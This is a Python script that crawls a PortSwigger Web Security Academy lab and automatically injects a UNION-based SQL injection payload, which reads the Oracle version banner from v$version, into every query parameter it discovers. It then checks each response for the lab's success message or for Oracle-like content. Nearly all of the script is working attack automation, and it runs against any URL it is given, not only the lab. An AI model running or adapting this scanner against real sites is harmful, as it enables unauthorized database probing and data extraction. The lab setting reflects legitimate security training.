#!/usr/bin/env python3
"""
sqli_union_scanner_detect_congrats.py

Crawls a PortSwigger lab base URL, tries a UNION-based payload across discovered endpoints,
and stops when the exact success message "Congratulations, you solved the lab!" is seen.

Usage:
    python3 sqli_union_scanner_detect_congrats.py --url https://xxxx.web-security-academy.net [--cookie "session=..."]
"""
import argparse
import json
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote_plus

import requests
from bs4 import BeautifulSoup
from requests.exceptions import RequestException

# --- CONFIG ---
HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; sqli-union-scanner/1.0)"}
TIMEOUT = 10
MAX_PATHS = 300
SLEEP_BETWEEN_REQUESTS = 0.12

# The UNION payload to test (adjust if you want different payloads)
PAYLOAD_RAW = "Accessories' UNION SELECT banner, null FROM v$version--"

# Exact success message to detect (must match exactly as provided)
SUCCESS_EXACT = "Congratulations, you solved the lab!"

# Some additional helpful detection (keeps but we prioritize exact match)
ORACLE_PATTERNS = [
    re.compile(r"\bOracle\b", re.IGNORECASE),
    re.compile(r"\bbanner\b", re.IGNORECASE),
    re.compile(r"\bv\$version\b", re.IGNORECASE),
]

# --- Helpers ---


def normalize_url(base, link):
    joined = urljoin(base, link)
    p = urlparse(joined)
    return urlunparse((p.scheme, p.netloc, p.path, p.params, p.query, ""))


def same_host(base, url):
    return urlparse(base).netloc == urlparse(url).netloc


def crawl(start_url, session, max_paths=MAX_PATHS):
    """Crawl same-host links and form actions."""
    to_visit = [start_url]
    seen = set()
    discovered = set()

    while to_visit and len(discovered) < max_paths:
        url = to_visit.pop(0)
        if url in seen:
            continue
        seen.add(url)
        try:
            r = session.get(url, headers=HEADERS, timeout=TIMEOUT, allow_redirects=True)
            html = r.text
        except RequestException:
            continue

        soup = BeautifulSoup(html, "html.parser")

        # <a href>
        for a in soup.find_all("a", href=True):
            link = normalize_url(url, a["href"])
            if same_host(start_url, link) and link not in seen:
                if link not in to_visit:
                    to_visit.append(link)
                discovered.add(link)

        # form actions
        for f in soup.find_all("form", action=True):
            action = f["action"] or url
            link = normalize_url(url, action)
            if same_host(start_url, link):
                discovered.add(link)

        discovered.add(url)
        time.sleep(0.08)

    return sorted(discovered)


def build_test_urls(target_url):
    """Generate test URLs by replacing params or appending category if no params."""
    p = urlparse(target_url)
    qs = parse_qs(p.query, keep_blank_values=True)
    tests = []

    if qs:
        # replace each param individually
        for param in qs.keys():
            new_qs = qs.copy()
            new_qs[param] = [PAYLOAD_RAW]
            new_query = urlencode(new_qs, doseq=True)
            new_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, ""))
            tests.append((f"param_replace:{param}", new_url))

        # replace all params
        all_qs = {k: [PAYLOAD_RAW] for k in qs.keys()}
        new_query = urlencode(all_qs, doseq=True)
        new_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, ""))
        tests.append(("param_replace:ALL", new_url))
    else:
        new_query = f"category={PAYLOAD_RAW}"
        new_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, ""))
        tests.append(("append:category", new_url))

    return tests


def check_response(text):
    """Return ('exact', None) if exact success string found,
       ('oracle', pattern) if Oracle-like content found,
       (None, None) otherwise."""
    if SUCCESS_EXACT in text:
        return ("exact", SUCCESS_EXACT)
    for pat in ORACLE_PATTERNS:
        if pat.search(text):
            return ("oracle", pat.pattern)
    return (None, None)


def main():
    parser = argparse.ArgumentParser(description="UNION-based SQLi automation with exact success detection.")
    parser.add_argument("--url", "-u", required=True, help="Base lab URL (https://xxxx.web-security-academy.net)")
    parser.add_argument("--cookie", "-c", help="Optional Cookie header (e.g. 'session=...')")
    parser.add_argument("--timeout", type=int, default=TIMEOUT)
    parser.add_argument("--max", type=int, default=MAX_PATHS)
    args = parser.parse_args()

    base = args.url.rstrip("/")
    session = requests.Session()
    session.headers.update(HEADERS)
    if args.cookie:
        session.headers.update({"Cookie": args.cookie})
    global TIMEOUT, MAX_PATHS
    TIMEOUT = args.timeout
    MAX_PATHS = args.max

    print(f"[+] Crawling {base} (same host) ...")
    endpoints = crawl(base, session, max_paths=MAX_PATHS)
    print(f"[+] Discovered {len(endpoints)} endpoints.")

    results = []
    found = False

    for ep in endpoints:
        tests = build_test_urls(ep)
        for desc, test_url in tests:
            try:
                print(f"[+] Testing {desc} -> {test_url}")
                r = session.get(test_url, timeout=TIMEOUT, allow_redirects=True)
                body = r.text
                tag, matched = check_response(body)

                record = {
                    "tested_url": test_url,
                    "original": ep,
                    "test_type": desc,
                    "status_code": r.status_code,
                    "content_length": len(body),
                    "detection": tag,
                    "matched": matched,
                }
                results.append(record)

                if tag == "exact":
                    print("\n[!!!] EXACT SUCCESS DETECTED !!!")
                    print(f"[!!!] URL: {test_url}")
                    print(f"[!!!] Matched string: {matched}\n")
                    found = True
                    # save and exit
                    with open("results.json", "w") as fh:
                        json.dump({"base_url": base, "results": results, "success": record}, fh, indent=2)
                    return
                elif tag == "oracle":
                    print(f"[+] Oracle-like content at {test_url} (pattern: {matched})")

            except RequestException as e:
                print(f"[!] Request error for {test_url}: {e}")
                results.append({"tested_url": test_url, "original": ep, "test_type": desc, "error": str(e)})

            time.sleep(SLEEP_BETWEEN_REQUESTS)

    # finished scanning
    print("[+] Scan complete.")
    if not found:
        print("[+] Exact success string not found. See results.json for details.")
    with open("results.json", "w") as fh:
        json.dump({"base_url": base, "results": results}, fh, indent=2)


if __name__ == "__main__":
    main()

